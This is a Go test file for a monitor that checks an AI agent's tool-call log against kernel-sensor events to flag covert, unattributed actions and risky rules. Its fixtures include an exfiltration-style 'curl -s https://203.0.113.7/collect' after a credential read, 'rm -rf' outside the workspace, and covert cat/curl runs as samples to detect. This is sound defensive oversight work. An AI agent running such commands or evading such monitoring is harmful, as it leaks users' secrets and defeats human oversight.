package report

import (
	"bytes"
	"encoding/json"
	"flag"
	"io"
	"os"
	"path/filepath"
	"strings"
	"testing"
	"time"

	"github.com/c4rb0nx1/tuprwre/internal/event"
	"github.com/c4rb0nx1/tuprwre/internal/rules"
)

var update = flag.Bool("update", false, "rewrite golden files in testdata")

var (
	gatewayFixture  = filepath.Join("testdata", "gateway.jsonl")
	tetragonFixture = filepath.Join("..", "sensor", "tetragon", "testdata", "session.expected.jsonl")
	contractSession = filepath.Join("..", "sensor", "testdata", "contract", "session.jsonl")
)

func open(t *testing.T, name string) *os.File {
	t.Helper()
	f, err := os.Open(name)
	if err != nil {
		t.Fatal(err)
	}
	t.Cleanup(func() { f.Close() })
	return f
}

func build(t *testing.T, opts Options, files ...string) *Report {
	t.Helper()
	var readers []io.Reader
	for _, f := range files {
		readers = append(readers, open(t, f))
	}
	evs, st, err := Load(readers...)
	if err != nil {
		t.Fatal(err)
	}
	return Build(evs, st, opts)
}

func session(t *testing.T, r *Report, id string) *Session {
	t.Helper()
	for _, s := range r.Sessions {
		if s.ID == id {
			return s
		}
	}
	t.Fatalf("no session %q", id)
	return nil
}

func effectBy(t *testing.T, s *Session, kind event.Kind, pid int) *Effect {
	t.Helper()
	for _, ef := range s.Effects {
		if ef.Kind == kind && ef.PID == pid {
			return ef
		}
	}
	t.Fatalf("no %s effect for pid %d", kind, pid)
	return nil
}

// TestReconcileGatewayAndTetragon is the end-to-end fixture: the gateway log
// and the Tetragon adapter's normalized output for the same session.
func TestReconcileGatewayAndTetragon(t *testing.T) {
	r := build(t, Options{}, gatewayFixture, tetragonFixture)

	if r.Load.Duplicates != 1 || r.Load.Malformed != 1 || r.Load.InvalidEffects != 0 || r.Load.Events != 14+25 {
		t.Errorf("load = %+v", r.Load)
	}
	if len(r.Sessions) != 2 || r.Sessions[0].ID != "sess-tg-1" || r.Worst() != rules.Red {
		t.Fatalf("sessions = %d worst = %s", len(r.Sessions), r.Worst())
	}
	s := session(t, r, "sess-tg-1")
	if s.Workspace != "/home/agent/work" || !s.WorkspaceInferred {
		t.Errorf("workspace = %q inferred=%v", s.Workspace, s.WorkspaceInferred)
	}

	wantIntents := map[string]string{
		"toolu_01": rules.RuleIaCApply,
		"toolu_02": rules.RuleRmOutsideWorkspace,
		"toolu_03": "",
		"toolu_04": rules.RuleGitForcePushProtected,
		"toolu_05": "",
	}
	wantEffects := map[string]int{"toolu_01": 5, "toolu_02": 4, "toolu_03": 1, "toolu_04": 5, "toolu_05": 0}
	for _, in := range s.Intents {
		if in.Rule != wantIntents[in.ToolCallID] || in.Effects != wantEffects[in.ToolCallID] {
			t.Errorf("%s: rule %q effects %d, want %q %d", in.ToolCallID, in.Rule, in.Effects,
				wantIntents[in.ToolCallID], wantEffects[in.ToolCallID])
		}
	}
	if in := s.Intents[0]; in.ResultTime == nil || !in.ResultIsError {
		t.Errorf("toolu_01 result not paired: %+v", in)
	}

	attr := []struct {
		kind event.Kind
		pid  int
		call string
		how  string
	}{
		{event.KindExec, 4001, "toolu_01", "command-line"},
		{event.KindExec, 4002, "toolu_01", "descendant"},
		{event.KindNetConnect, 4002, "toolu_01", "process"},
		{event.KindExec, 4004, "toolu_02", "descendant"},
		{event.KindFileWrite, 4000, "toolu_03", "path"},
		{event.KindExec, 4008, "toolu_04", "descendant"},
	}
	for _, a := range attr {
		ef := effectBy(t, s, a.kind, a.pid)
		if ef.Attribution == nil || ef.Attribution.ToolCallID != a.call || ef.Attribution.How != a.how {
			t.Errorf("%s pid %d attribution = %+v, want %s/%s", a.kind, a.pid, ef.Attribution, a.call, a.how)
		}
	}

	if root := effectBy(t, s, event.KindExec, 4000); !root.Root || root.Covert {
		t.Errorf("harness exec root=%v covert=%v", root.Root, root.Covert)
	}
	if lo := effectBy(t, s, event.KindNetConnect, 4000); !lo.Loopback || lo.Covert || !lo.Harness {
		t.Errorf("loopback connect = %+v", lo)
	}

	var covert []string
	byID := map[string]*Effect{}
	for _, ef := range s.Effects {
		byID[ef.ID] = ef
	}
	for _, id := range s.Covert {
		ef := byID[id]
		covert = append(covert, string(ef.Kind)+":"+ef.Summary[:strings.IndexByte(ef.Summary+" ", ' ')])
	}
	wantCovert := []string{
		"exec:/usr/bin/cat", "file_read_sensitive:cat", "exec:/usr/bin/curl", "net_connect:curl", "exec:/usr/bin/sleep",
	}
	if strings.Join(covert, ",") != strings.Join(wantCovert, ",") {
		t.Errorf("covert = %v, want %v", covert, wantCovert)
	}

	// Credential read at 08.6 taints later egress: curl and its connect
	// (covert) and git's connect (attributed) turn red.
	for _, c := range []struct {
		kind event.Kind
		pid  int
	}{{event.KindExec, 4006}, {event.KindNetConnect, 4006}, {event.KindNetConnect, 4008}} {
		if ef := effectBy(t, s, c.kind, c.pid); ef.Rule != rules.RuleCredentialThenEgress {
			t.Errorf("%s pid %d rule = %q", c.kind, c.pid, ef.Rule)
		}
	}
	// Terraform's connect preceded the credential read.
	if ef := effectBy(t, s, event.KindNetConnect, 4002); ef.Tier != rules.Green {
		t.Errorf("terraform connect = %s/%s", ef.Tier, ef.Rule)
	}
	if s.Tiers[rules.Red] != 12 || s.Tiers[rules.Yellow] != 2 || s.Tiers[rules.Green] != 16 {
		t.Errorf("tiers = %v", s.Tiers)
	}
}

// TestIntentOnlySession proves the report works on gateway logs alone,
// including argv-style commands, JSON-string arguments and the cross-event
// credential rule across intents.
func TestIntentOnlySession(t *testing.T) {
	s := session(t, build(t, Options{}, gatewayFixture), "sess-gw-only")
	want := []struct {
		tier rules.Tier
		rule string
	}{
		{rules.Red, rules.RuleKubectlProd},
		{rules.Yellow, rules.RuleCredentialRead},
		{rules.Red, rules.RuleCredentialThenEgress},
		{rules.Green, ""},
	}
	if len(s.Intents) != len(want) || len(s.Effects) != 0 || len(s.Covert) != 0 || s.Workspace != "" {
		t.Fatalf("session = %+v", s)
	}
	for i, w := range want {
		if in := s.Intents[i]; in.Tier != w.tier || in.Rule != w.rule {
			t.Errorf("intent %s = %s/%s, want %s/%s", in.ToolCallID, in.Tier, in.Rule, w.tier, w.rule)
		}
	}
	if s.Intents[3].Complete {
		t.Error("incomplete intent reported complete")
	}
	if s.Intents[2].Summary != "curl -s https://203.0.113.7/collect" {
		t.Errorf("summary = %q", s.Intents[2].Summary)
	}
}

// TestSensorOnlySession proves effects without any gateway log are all
// unmatched except the root, and pid-free fixtures still build a tree.
func TestSensorOnlySession(t *testing.T) {
	s := session(t, build(t, Options{Workspace: "/home/agent/work"}, contractSession), "sess-fixture-2")
	if s.WorkspaceInferred || len(s.Intents) != 0 {
		t.Fatalf("session = %+v", s)
	}
	// 10 effects: the root exec and one proc_exit are never covert.
	if len(s.Covert) != 8 {
		t.Errorf("covert = %d, want 8", len(s.Covert))
	}
	if rm := effectBy(t, s, event.KindExec, 3002); rm.Rule != rules.RuleRmOutsideWorkspace {
		t.Errorf("rm verdict = %+v", rm.Verdict)
	}
	if tf := effectBy(t, s, event.KindExec, 3001); tf.Rule != rules.RuleIaCApply {
		t.Errorf("terraform verdict = %+v", tf.Verdict)
	}
}

// TestAttributionWindow proves an effect outside a call's window (after its
// result plus slack) is not attributed to it.
func TestAttributionWindow(t *testing.T) {
	t0 := time.Date(2026, 9, 21, 9, 0, 0, 0, time.UTC)
	intent := event.New(event.SourceGateway, event.KindToolCallIntent, t0)
	intent.SessionID, intent.ToolCallID, intent.ToolName, intent.Complete = "s", "c1", "Bash", true
	intent.Arguments = json.RawMessage(`{"command":"make test"}`)
	res := event.New(event.SourceGateway, event.KindToolResult, t0.Add(time.Second))
	res.SessionID, res.ToolCallID = "s", "c1"

	exec := func(at time.Duration, pid int) event.Event {
		e := event.New(event.SourceSensor, event.KindExec, t0.Add(at))
		e.SessionID, e.Sensor = "s", "t"
		e.Process = &event.Process{PID: pid, ExecID: "x" + string(rune('0'+pid)), Binary: "/usr/bin/make", Argv: []string{"make", "-j4", "test"}}
		return e
	}
	inWin, late := exec(500*time.Millisecond, 1), exec(10*time.Second, 2)

	s := Build([]event.Event{intent, res, inWin, late}, LoadStats{}, Options{Slack: time.Second}).Sessions[0]
	if a := effectBy(t, s, event.KindExec, 1).Attribution; a == nil || a.How != "binary" {
		t.Errorf("in-window exec attribution = %+v", a)
	}
	if a := effectBy(t, s, event.KindExec, 2).Attribution; a != nil {
		t.Errorf("late exec attributed: %+v", a)
	}

	// Without a result, the window runs to Options.Window.
	s = Build([]event.Event{intent, inWin, late}, LoadStats{}, Options{Slack: time.Second, Window: time.Minute}).Sessions[0]
	if a := effectBy(t, s, event.KindExec, 2).Attribution; a == nil {
		t.Error("exec within Window not attributed when no result was recorded")
	}
}

// TestLoadDropsInvalidAndIgnored proves the loader's accounting.
func TestLoadDropsInvalidAndIgnored(t *testing.T) {
	input := strings.Join([]string{
		`{"version":"0","id":"a","time":"2026-09-21T09:00:00Z","source":"sensor","kind":"exec","sensor":"t","process":{"pid":1,"binary":"rel"}}`,
		`{"version":"0","id":"b","time":"2026-09-21T09:00:00Z","source":"shell","kind":"exec"}`,
		`{"version":"0","time":"2026-09-21T09:00:00Z","source":"gateway","kind":"tool_result"}`,
		``,
		`{"version":"0","id":"c","time":"2026-09-21T09:00:00Z","source":"gateway","kind":"tool_result","tool_call_id":"x"}`,
	}, "\n")
	evs, st, err := Load(strings.NewReader(input), strings.NewReader(`{"version":"0","id":"c","time":"2026-09-21T09:00:00Z","source":"gateway","kind":"tool_result"}`))
	if err != nil {
		t.Fatal(err)
	}
	if len(evs) != 1 || st.InvalidEffects != 1 || st.Ignored != 1 || st.Malformed != 1 || st.Duplicates != 1 {
		t.Errorf("events = %d stats = %+v", len(evs), st)
	}
}

func TestExtractFacts(t *testing.T) {
	f := extractFacts(json.RawMessage(`{"command":["bash","-lc","cd x && rm -rf y"],"workdir":"/srv/r","nested":{"target_path":"rel/p","other":"/etc/hosts"}}`))
	if len(f.argvs) != 1 || f.cwd != "/srv/r" || strings.Join(f.paths, ",") != "/etc/hosts,rel/p" {
		t.Errorf("facts = %+v", f)
	}
	cmds := f.commands("")
	if len(cmds) != 2 || cmds[1].Argv[0] != "rm" || cmds[1].Cwd != "/srv/r/x" {
		t.Errorf("commands = %+v", cmds)
	}
	if lines := f.commandLines(); len(lines) != 2 || lines[1] != "cd x && rm -rf y" {
		t.Errorf("command lines = %q", lines)
	}
	if got := extractFacts(json.RawMessage(`"{\"cmd\":\"ls\"}"`)); len(got.scripts) != 1 {
		t.Errorf("string-encoded arguments: %+v", got)
	}
	if got := extractFacts(json.RawMessage(`not json`)); len(got.strs) != 0 {
		t.Errorf("invalid arguments: %+v", got)
	}
}

func TestContainsTokens(t *testing.T) {
	words := strings.Fields("/usr/bin/bash -c ls -la")
	if !containsTokens(words, []string{"ls", "-la"}) || containsTokens(words, []string{"la"}) ||
		containsTokens(strings.Fields("/usr/bin/false"), []string{"ls"}) || containsTokens(words, nil) {
		t.Error("containsTokens")
	}
}

// TestTextGolden pins the human-readable rendering of the end-to-end fixture.
func TestTextGolden(t *testing.T) {
	r := build(t, Options{}, gatewayFixture, tetragonFixture)
	var got bytes.Buffer
	if err := WriteText(&got, r); err != nil {
		t.Fatal(err)
	}
	golden := filepath.Join("testdata", "report.golden.txt")
	if *update {
		if err := os.WriteFile(golden, got.Bytes(), 0o644); err != nil {
			t.Fatal(err)
		}
	}
	want, err := os.ReadFile(golden)
	if err != nil {
		t.Fatalf("read golden (run with -update to create): %v", err)
	}
	if !bytes.Equal(got.Bytes(), want) {
		t.Errorf("text report differs from %s (run with -update after an intentional change):\n%s", golden, got.String())
	}
}

func TestWriteJSON(t *testing.T) {
	r := build(t, Options{}, gatewayFixture, tetragonFixture)
	var buf bytes.Buffer
	if err := WriteJSON(&buf, r); err != nil {
		t.Fatal(err)
	}
	var back struct {
		Sessions []struct {
			ID     string           `json:"session_id"`
			Worst  string           `json:"worst"`
			Covert []string         `json:"covert_candidates"`
			Tiers  map[string]int   `json:"tiers"`
			Intent []map[string]any `json:"intents"`
			Effect []map[string]any `json:"effects"`
		} `json:"sessions"`
	}
	if err := json.Unmarshal(buf.Bytes(), &back); err != nil {
		t.Fatal(err)
	}
	if len(back.Sessions) != 2 || back.Sessions[0].Worst != "red" || len(back.Sessions[0].Covert) != 5 ||
		back.Sessions[0].Tiers["red"] != 12 || back.Sessions[0].Intent[0]["rule"] != rules.RuleIaCApply {
		t.Errorf("json = %s", buf.String())
	}
}

// TestHarnessPredatesSensor proves that when the harness was already running
// before the sensor started (its exec never recorded), its children are not
// mistaken for session roots and remain covert candidates.
func TestHarnessPredatesSensor(t *testing.T) {
	t0 := time.Date(2026, 9, 21, 9, 0, 0, 0, time.UTC)
	mk := func(at time.Duration, kind event.Kind, pid int, execID, parent, bin, cwd string) event.Event {
		e := event.New(event.SourceSensor, kind, t0.Add(at))
		e.SessionID, e.Sensor = "s", "t"
		e.Process = &event.Process{PID: pid, ExecID: execID, ParentExecID: parent, Binary: bin, Argv: []string{bin}, Cwd: cwd}
		return e
	}
	w := mk(3*time.Second, event.KindFileWrite, 100, "harness", "shell", "/usr/bin/node", "/w")
	w.File = &event.File{Path: "/w/state.json"}
	evs := []event.Event{
		mk(time.Second, event.KindExec, 101, "c1", "harness", "/usr/bin/ls", "/w"),
		mk(2*time.Second, event.KindExec, 102, "c2", "harness", "/usr/bin/cat", "/w"),
		w,
	}
	s := Build(evs, LoadStats{}, Options{}).Sessions[0]
	if len(s.Covert) != 3 {
		t.Errorf("covert = %v, want all 3 effects", s.Covert)
	}
	if s.Workspace != "/w" || !s.WorkspaceInferred {
		t.Errorf("workspace = %q", s.Workspace)
	}
	if ef := effectBy(t, s, event.KindExec, 101); ef.Root {
		t.Error("child of an unseen harness marked as session root")
	}
	if ef := effectBy(t, s, event.KindFileWrite, 100); !ef.Harness {
		t.Error("write by the unseen harness not labelled harness")
	}
}

func TestEmptySessionIsGreen(t *testing.T) {
	res := event.New(event.SourceGateway, event.KindToolResult, time.Now())
	res.SessionID, res.ToolCallID = "s", "c"
	if s := Build([]event.Event{res}, LoadStats{}, Options{}).Sessions[0]; s.Worst != rules.Green {
		t.Errorf("worst = %q", s.Worst)
	}
}
